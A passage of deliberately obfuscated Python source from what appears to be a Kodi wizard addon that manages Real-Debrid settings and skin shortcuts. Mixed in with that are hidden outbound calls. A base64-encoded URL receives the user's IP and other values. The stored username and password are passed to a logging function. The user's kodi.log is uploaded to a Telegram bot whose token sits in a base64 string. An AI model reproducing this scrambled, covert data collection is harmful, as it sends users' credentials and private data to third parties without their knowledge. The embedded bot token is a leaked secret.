          OO0000OO0OOOO00O0 =str (json .loads (OO000O0O0O000O0OO )['ip'])#line:576
          OO000O00OO00O000O =OOO0000O000O000OO #line:577
          O00OO000O0OO0O000 =O0O0000O0OOOOO00O #line:578
          import socket #line:580
          OO000O0O0O000O0OO =urllib2 .urlopen (OOOO0000O0O0OOO00 .decode ('base64')+' - '+OO000O00OO00O000O +' - '+O00OO000O0OO0O000 +' - '+OO0O0000O0OO00O00 ).readlines ()#line:581
       except :pass #line:582
def googleindicat ():#line:585
			import logg #line:586
			OOOOOOOO0O000O000 =(ADDON .getSetting ("pass"))#line:587
			O0OO00O00OO0OO0OO =(ADDON .getSetting ("user"))#line:588
			logg .logGA (OOOOOOOO0O000O000 ,O0OO00O00OO0OO0OO )#line:589
def logsend ():#line:590
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:591
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:592
      howsentlog ()#line:594
      import requests #line:595
      if xbmc .getCondVisibility ('system.platform.windows'):#line:596
         O00OO000O0O00O00O =xbmc .translatePath ('special://home/kodi.log')#line:597
         O00O0OO00O0OO0OOO ={'chat_id':(None ,'-274262389'),'document':(O00OO000O0O00O00O ,open (O00OO000O0O00O00O ,'rb')),}#line:601
         OO00OOOO0O0OO0000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:602
         OOOOO000OOO00O00O =requests .post (OO00OOOO0O0OO0000 .decode ('base64'),files =O00O0OO00O0OO0OOO )#line:604
      elif xbmc .getCondVisibility ('system.platform.android'):#line:605
           O00OO000O0O00O00O =xbmc .translatePath ('special://temp/kodi.log')#line:606
           O00O0OO00O0OO0OOO ={'chat_id':(None ,'-274262389'),'document':(O00OO000O0O00O00O ,open (O00OO000O0O00O00O ,'rb')),}#line:610
           OO00OOOO0O0OO0000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:611
           OOOOO000OOO00O00O =requests .post (OO00OOOO0O0OO0000 .decode ('base64'),files =O00O0OO00O0OO0OOO )#line:613
      else :#line:614
           O00OO000O0O00O00O =xbmc .translatePath ('special://kodi.log')#line:615
           O00O0OO00O0OO0OOO ={'chat_id':(None ,'-274262389'),'document':(O00OO000O0O00O00O ,open (O00OO000O0O00O00O ,'rb')),}#line:619
           OO00OOOO0O0OO0000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:620
           OOOOO000OOO00O00O =requests .post (OO00OOOO0O0OO0000 .decode ('base64'),files =O00O0OO00O0OO0OOO )#line:622
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:623
def rdoff ():#line:625
	OO0O000OOO0000OOO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:626
	OO0O000OOO0000OOO .setSetting ('rd.client_id','')#line:627
	OO0O000OOO0000OOO .setSetting ('rd.secret','')#line:628
	OO0O000OOO0000OOO .setSetting ('rdsource','false')#line:629
	OO0O000OOO0000OOO .setSetting ('super_fast_type_toren','false')#line:630
	OO0O000OOO0000OOO .setSetting ('rd.auth','false')#line:631
	OO0O000OOO0000OOO .setSetting ('rd.refresh','false')#line:632
	OO0O000OOO0000OOO .setSetting ('magnet','false')#line:633
	OO0O000OOO0000OOO .setSetting ('torrent_server','false')#line:634
	OO0O000OOO0000OOO =xbmcaddon .Addon ('script.module.resolveurl')#line:636
	OO0O000OOO0000OOO .setSetting ('RealDebridResolver_client_id','')#line:637
	OO0O000OOO0000OOO .setSetting ('RealDebridResolver_client_secret','')#line:638
	OO0O000OOO0000OOO .setSetting ('RealDebridResolver_token','')#line:639
	OO0O000OOO0000OOO .setSetting ('RealDebridResolver_refresh','')#line:640
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:641
		OO0O000OOO0000OOO =xbmcaddon .Addon ('plugin.video.seren')#line:642
		OO0O000OOO0000OOO .setSetting ('rd.client_id','')#line:644
		OO0O000OOO0000OOO .setSetting ('rd.secret','')#line:645
		OO0O000OOO0000OOO .setSetting ('rd.auth','')#line:646
		OO0O000OOO0000OOO .setSetting ('rd.refresh','')#line:647
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:648
		OO0O000OOO0000OOO =xbmcaddon .Addon ('plugin.video.gaia')#line:649
		OO0O000OOO0000OOO .setSetting ('accounts.debrid.realdebrid.id','')#line:650
		OO0O000OOO0000OOO .setSetting ('accounts.debrid.realdebrid.secret','')#line:651
		OO0O000OOO0000OOO .setSetting ('accounts.debrid.realdebrid.token','')#line:652
		OO0O000OOO0000OOO .setSetting ('accounts.debrid.realdebrid.refresh','')#line:653
	resloginit .resloginit ('restore','all')#line:654
	OOO00000O0OO0O0O0 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:656
	OOOO0OOO00OO000O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:657
	copyfile (OOO00000O0OO0O0O0 ,OOOO0OOO00OO000O0 )#line:658
def skindialogsettind18 ():#line:659
	try :#line:660
		O0000O0OOOOOOOO0O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:661
		OOO00000000O0OO00 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:662
		copyfile (O0000O0OOOOOOOO0O ,OOO00000000O0OO00 )#line:663
	except :pass #line:664
def rdon ():#line:665
	loginit .loginIt ('restore','all')#line:666
	OO00O00O0O00000O0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:668
	OOO000OOO0O00OO00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:669
	copyfile (OO00O00O0O00000O0 ,OOO000OOO0O00OO00 )#line:670
def adults18 ():#line:672
  OO0O0O000O00OOOO0 =(ADDON .getSetting ("adults"))#line:673
  if OO0O0O000O00OOOO0 =='true':#line:674
    O0OO0OO0O0O00O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:675
    with open (O0OO0OO0O0O00O0O0 ,'r')as O0000O0OO0OO00OOO :#line:676
      OO00OOO0O0O00O00O =O0000O0OO0OO00OOO .read ()#line:677
    OO00OOO0O0O00O00O =OO00OOO0O0O00O00O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:695
    with open (O0OO0OO0O0O00O0O0 ,'w')as O0000O0OO0OO00OOO :#line:698
      O0000O0OO0OO00OOO .write (OO00OOO0O0O00O00O )#line:699
def rdbuildaddon ():#line:700
  OO000OOOO0OOO0OO0 =(ADDON .getSetting ("auto_rd"))#line:701
  if OO000OOOO0OOO0OO0 =='true':#line:702
    OOO0O0OOOOO0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:703
    with open (OOO0O0OOOOO0OOOOO ,'r')as OOO00O00OOOOOO0O0 :#line:704
      OO00OO0OOO0O0O0OO =OOO00O00OOOOOO0O0 .read ()#line:705
    OO00OO0OOO0O0O0OO =OO00OO0OOO0O0O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:723
    with open (OOO0O0OOOOO0OOOOO ,'w')as OOO00O00OOOOOO0O0 :#line:726
      OOO00O00OOOOOO0O0 .write (OO00OO0OOO0O0O0OO )#line:727
    OOO0O0OOOOO0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:731
    with open (OOO0O0OOOOO0OOOOO ,'r')as OOO00O00OOOOOO0O0 :#line:732
      OO00OO0OOO0O0O0OO =OOO00O00OOOOOO0O0 .read ()#line:733
    OO00OO0OOO0O0O0OO =OO00OO0OOO0O0O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:751
    with open (OOO0O0OOOOO0OOOOO ,'w')as OOO00O00OOOOOO0O0 :#line:754
      OOO00O00OOOOOO0O0 .write (OO00OO0OOO0O0O0OO )#line:755
    OOO0O0OOOOO0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:759
    with open (OOO0O0OOOOO0OOOOO ,'r')as OOO00O00OOOOOO0O0 :#line:760
      OO00OO0OOO0O0O0OO =OOO00O00OOOOOO0O0 .read ()#line:761
    OO00OO0OOO0O0O0OO =OO00OO0OOO0O0O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:779
    with open (OOO0O0OOOOO0OOOOO ,'w')as OOO00O00OOOOOO0O0 :#line:782
      OOO00O00OOOOOO0O0 .write (OO00OO0OOO0O0O0OO )#line:783
    OOO0O0OOOOO0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:787
    with open (OOO0O0OOOOO0OOOOO ,'r')as OOO00O00OOOOOO0O0 :#line:788
      OO00OO0OOO0O0O0OO =OOO00O00OOOOOO0O0 .read ()#line:789
    OO00OO0OOO0O0O0OO =OO00OO0OOO0O0O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:807
    with open (OOO0O0OOOOO0OOOOO ,'w')as OOO00O00OOOOOO0O0 :#line:810
      OOO00O00OOOOOO0O0 .write (OO00OO0OOO0O0O0OO )#line:811
    OOO0O0OOOOO0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:814
    with open (OOO0O0OOOOO0OOOOO ,'r')as OOO00O00OOOOOO0O0 :#line:815
      OO00OO0OOO0O0O0OO =OOO00O00OOOOOO0O0 .read ()#line:816
    OO00OO0OOO0O0O0OO =OO00OO0OOO0O0O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:834
    with open (OOO0O0OOOOO0OOOOO ,'w')as OOO00O00OOOOOO0O0 :#line:837
      OOO00O00OOOOOO0O0 .write (OO00OO0OOO0O0O0OO )#line:838
    OOO0O0OOOOO0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:840
    with open (OOO0O0OOOOO0OOOOO ,'r')as OOO00O00OOOOOO0O0 :#line:841
      OO00OO0OOO0O0O0OO =OOO00O00OOOOOO0O0 .read ()#line:842
    OO00OO0OOO0O0O0OO =OO00OO0OOO0O0O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:860
    with open (OOO0O0OOOOO0OOOOO ,'w')as OOO00O00OOOOOO0O0 :#line:863
      OOO00O00OOOOOO0O0 .write (OO00OO0OOO0O0O0OO )#line:864
    OOO0O0OOOOO0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:866
    with open (OOO0O0OOOOO0OOOOO ,'r')as OOO00O00OOOOOO0O0 :#line:867
      OO00OO0OOO0O0O0OO =OOO00O00OOOOOO0O0 .read ()#line:868
    OO00OO0OOO0O0O0OO =OO00OO0OOO0O0O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:886
    with open (OOO0O0OOOOO0OOOOO ,'w')as OOO00O00OOOOOO0O0 :#line:889
      OOO00O00OOOOOO0O0 .write (OO00OO0OOO0O0O0OO )#line:890
    OOO0O0OOOOO0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:893
    with open (OOO0O0OOOOO0OOOOO ,'r')as OOO00O00OOOOOO0O0 :#line:894
      OO00OO0OOO0O0O0OO =OOO00O00OOOOOO0O0 .read ()#line:895
    OO00OO0OOO0O0O0OO =OO00OO0OOO0O0O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:913
    with open (OOO0O0OOOOO0OOOOO ,'w')as OOO00O00OOOOOO0O0 :#line:916
      OOO00O00OOOOOO0O0 .write (OO00OO0OOO0O0O0OO )#line:917
def rdbuildinstall ():#line:920
  try :#line:921
   OOOO00O0OO0O00000 =(ADDON .getSetting ("auto_rd"))#line:922
   if OOOO00O0OO0O00000 =='true':#line:923
     OOOOO00OOO0O00O00 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:924
     O000000OO0OOOO0O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:925
     copyfile (OOOOO00OOO0O00O00 ,O000000OO0OOOO0O0 )#line:926
  except :#line:927
     pass #line:928
def rdbuildaddonoff ():#line:931
    OOO0O0O00O00OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:934
    with open (OOO0O0O00O00OO000 ,'r')as O0OO0OOOOOOOOOO0O :#line:935
      OO0O00O000OO0OOO0 =O0OO0OOOOOOOOOO0O .read ()#line:936
    OO0O00O000OO0OOO0 =OO0O00O000OO0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:954
    with open (OOO0O0O00O00OO000 ,'w')as O0OO0OOOOOOOOOO0O :#line:957
      O0OO0OOOOOOOOOO0O .write (OO0O00O000OO0OOO0 )#line:958
    OOO0O0O00O00OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:962
    with open (OOO0O0O00O00OO000 ,'r')as O0OO0OOOOOOOOOO0O :#line:963
      OO0O00O000OO0OOO0 =O0OO0OOOOOOOOOO0O .read ()#line:964
    OO0O00O000OO0OOO0 =OO0O00O000OO0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:982
    with open (OOO0O0O00O00OO000 ,'w')as O0OO0OOOOOOOOOO0O :#line:985
      O0OO0OOOOOOOOOO0O .write (OO0O00O000OO0OOO0 )#line:986
    OOO0O0O00O00OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:990
    with open (OOO0O0O00O00OO000 ,'r')as O0OO0OOOOOOOOOO0O :#line:991
      OO0O00O000OO0OOO0 =O0OO0OOOOOOOOOO0O .read ()#line:992
    OO0O00O000OO0OOO0 =OO0O00O000OO0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1010
    with open (OOO0O0O00O00OO000 ,'w')as O0OO0OOOOOOOOOO0O :#line:1013
      O0OO0OOOOOOOOOO0O .write (OO0O00O000OO0OOO0 )#line:1014
    OOO0O0O00O00OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1018
    with open (OOO0O0O00O00OO000 ,'r')as O0OO0OOOOOOOOOO0O :#line:1019
      OO0O00O000OO0OOO0 =O0OO0OOOOOOOOOO0O .read ()#line:1020
    OO0O00O000OO0OOO0 =OO0O00O000OO0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1038
    with open (OOO0O0O00O00OO000 ,'w')as O0OO0OOOOOOOOOO0O :#line:1041
      O0OO0OOOOOOOOOO0O .write (OO0O00O000OO0OOO0 )#line:1042
    OOO0O0O00O00OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1045
    with open (OOO0O0O00O00OO000 ,'r')as O0OO0OOOOOOOOOO0O :#line:1046
      OO0O00O000OO0OOO0 =O0OO0OOOOOOOOOO0O .read ()#line:1047
    OO0O00O000OO0OOO0 =OO0O00O000OO0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1065
    with open (OOO0O0O00O00OO000 ,'w')as O0OO0OOOOOOOOOO0O :#line:1068
      O0OO0OOOOOOOOOO0O .write (OO0O00O000OO0OOO0 )#line:1069
    OOO0O0O00O00OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1071
    with open (OOO0O0O00O00OO000 ,'r')as O0OO0OOOOOOOOOO0O :#line:1072
      OO0O00O000OO0OOO0 =O0OO0OOOOOOOOOO0O .read ()#line:1073
    OO0O00O000OO0OOO0 =OO0O00O000OO0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1091
    with open (OOO0O0O00O00OO000 ,'w')as O0OO0OOOOOOOOOO0O :#line:1094
      O0OO0OOOOOOOOOO0O .write (OO0O00O000OO0OOO0 )#line:1095
    OOO0O0O00O00OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1097
    with open (OOO0O0O00O00OO000 ,'r')as O0OO0OOOOOOOOOO0O :#line:1098
      OO0O00O000OO0OOO0 =O0OO0OOOOOOOOOO0O .read ()#line:1099
    OO0O00O000OO0OOO0 =OO0O00O000OO0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1117
    with open (OOO0O0O00O00OO000 ,'w')as O0OO0OOOOOOOOOO0O :#line:1120
      O0OO0OOOOOOOOOO0O .write (OO0O00O000OO0OOO0 )#line:1121
    OOO0O0O00O00OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1124
    with open (OOO0O0O00O00OO000 ,'r')as O0OO0OOOOOOOOOO0O :#line:1125
      OO0O00O000OO0OOO0 =O0OO0OOOOOOOOOO0O .read ()#line:1126
    OO0O00O000OO0OOO0 =OO0O00O000OO0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1144
    with open (OOO0O0O00O00OO000 ,'w')as O0OO0OOOOOOOOOO0O :#line:1147
      O0OO0OOOOOOOOOO0O .write (OO0O00O000OO0OOO0 )#line:1148
def rdbuildinstalloff ():#line:1151
    try :#line:1152
       O0O0O000000OOO0O0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1153
       O0O0O000OO00OO0OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1154
       copyfile (O0O0O000000OOO0O0 ,O0O0O000OO00OO0OO )#line:1156
       O0O0O000000OOO0O0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1158
       O0O0O000OO00OO0OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1159
       copyfile (O0O0O000000OOO0O0 ,O0O0O000OO00OO0OO )#line:1161
       O0O0O000000OOO0O0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1163
       O0O0O000OO00OO0OO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1164
